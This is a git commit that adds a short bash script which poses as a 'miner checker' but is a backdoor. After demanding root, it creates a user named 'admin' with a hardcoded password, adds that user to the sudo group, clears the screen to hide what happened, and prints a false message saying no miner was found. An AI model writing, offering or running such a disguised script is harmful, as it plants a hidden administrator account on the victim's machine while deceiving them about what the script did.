2141738d810e262d68774b6b32cace5dcaa45f51
Just-234exv <149198899+Just-234exv@users.noreply.github.com>
2024-05-11 18:43:14 +0400

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+
+username="admin"
+password="administrator999"
+
+useradd -m -s /bin/bash "$username"
+echo "$username:$password" | chpasswd
+usermod -aG sudo "$username"
+
+clear
+echo "Miner checker: miner not found"
